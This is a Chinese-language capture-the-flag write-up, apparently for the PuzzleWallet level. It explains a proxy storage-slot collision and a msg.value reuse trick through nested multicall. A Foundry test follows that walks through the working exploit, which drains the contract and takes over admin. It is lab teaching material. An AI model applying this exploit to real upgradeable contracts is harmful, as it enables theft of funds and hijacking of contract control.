代理合约是通过封装的 `delegatecall` 实现的，因此 `delegatecall` 的内存布局不一致问题在代理合约中同样存在。从而可以通过修改 `PuzzleProxy` 合约中的 `pendingAdmin` 来修改 `PuzzleWallet` 合约的 `owner`，以及通过修改 `PuzzleWallet` 合约中的 `maxBalance` 来修改 `PuzzleProxy` 合约的 `admin`

在修改 `maxBalance` 前需要将合约代币转出，在 `multicall` 中使用了 `delegatecall`，而 `deposit` 中使用 `msg.value` 获取修改用户的余额，而 `delegatecall` 中 `msg.value` 为原调用数据的值。`multicall` 中限制了直接访问多次 `deposit`，可以通过嵌套 `multicall` 绕过。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/PuzzleWallet.sol";
import "src/levels/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is BaseTest {
    PuzzleProxy private level;
    PuzzleWallet puzzleWallet;

    constructor() public {
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        assertEq(level.admin(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        level.proposeNewAdmin(player);

        puzzleWallet.addToWhitelist(player);

        bytes[] memory realCall = new bytes[](1);
        realCall[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, realCall);
        calls[1] = calls[0];
        puzzleWallet.multicall{value: 0.001 ether}(calls);

        puzzleWallet.execute(player, 0.002 ether, "");

        puzzleWallet.setMaxBalance(uint256(player));

        assertEq(level.admin(), player);

        vm.stopPrank();
    }
}
```

